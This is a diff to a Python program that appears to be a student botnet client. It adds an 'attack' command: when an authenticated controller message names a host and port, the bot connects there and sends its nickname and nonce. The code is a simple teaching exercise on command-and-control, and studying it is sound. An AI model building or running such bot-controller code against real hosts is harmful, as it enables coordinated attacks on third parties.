@@ -19,8 +19,9 @@ import hashlib
 import shlex
 import time
 from array import *
+from typing import Union
 
-#globals
+#global nonce 
 seen_nonces = list()
 commands_exe = 0    #maybe change so its not global
 
@@ -35,6 +36,7 @@ def parse_args():
     #parser.add_argument('-d', '--debug', action='store_true',
     #                    help="enable debugging output")
     return parser.parse_args()
+
 
 def status_cmd(sock: socket, nick: str):
     global commands_exe
@@ -52,6 +54,23 @@ def shutdown_cmd(sock: socket, nick: str):
     print("I have shutdown")
     exit(1)
 
+
+
+def attack_server(hostname: Union[str, int], port:int, nickname:str, nonce: str):
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((hostname, port))
+        attack_send = nickname + nonce
+        try:
+            client_socket.send(attack_send.encode())
+        except :
+            print("-attack ", nickname, " FAIL Could not send attack")
+
+    except (ConnectionAbortedError, ConnectionRefusedError, ConnectionResetError) as error:
+        print("-attack ", nickname, " FAIL ", error)
+        return
+
+    return
 
 def client_program(args: str, sock: socket):
 
@@ -94,9 +113,14 @@ def client_program(args: str, sock: socket):
                 shutdown_cmd(sock, args.nickname)
                 #implement shutdown bot
                 commands_exe += 1
+            elif cmd_data[2] == "attack":
+                    split_attack = cmd_data[3].split(":")
+                    attack_server(split_attack[0], int(split_attack[1]), args.nickname, cmd_data[0])
+                    print("-attack ", args.nickname , " OK")
             #print("command authenticated")
         #else we ignore comand
             #print("macs do not match")
+
         
         #client_socket.send(message.encode)
         #client_socket.close()
